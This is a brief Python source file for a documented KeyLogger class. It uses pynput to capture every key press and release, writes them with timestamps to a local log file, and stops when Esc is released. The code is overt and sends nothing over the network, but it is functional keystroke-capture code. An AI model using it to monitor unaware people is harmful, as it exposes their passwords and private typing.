
from pynput import keyboard
import logging
from config import LOG_FILE

class KeyLogger:
    """
    A class to handle keyboard event logging.
    It sets up a listener and logs key presses and releases.
    """
    def __init__(self):
        """
        Initializes the KeyLogger, setting up the logging configuration.
        """
        # The format includes timestamp, log level, and the message
        logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                            format='%(asctime)s: %(message)s')
        self.logger = logging.getLogger() # Get the root logger

    def _on_press(self, key):
        """
        This function is called when a key is pressed.
        It logs the key press event.
        """
        try:
            # Log the alphanumeric key pressed
            self.logger.info(f"Key pressed: {key.char}")
        except AttributeError:
            # Convert the key to a string for logging
            self.logger.info(f"Special key pressed: {str(key)}")

    def _on_release(self, key):
        """
        This function is called when a key is released.
        It logs the key release event and stops the listener if 'esc' is pressed.
        """
        self.logger.info(f"Key released: {str(key)}")
        # If the 'esc' key is released, stop the listener
        if key == keyboard.Key.esc:
            print("\nExiting keystroke capture. Check the log file for output.")
            # Stop listener by returning False
            return False

    def start_listener(self):
        """
        Starts the keyboard listener.
        """
        with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
            # Join the listener thread to the main thread
            listener.join()
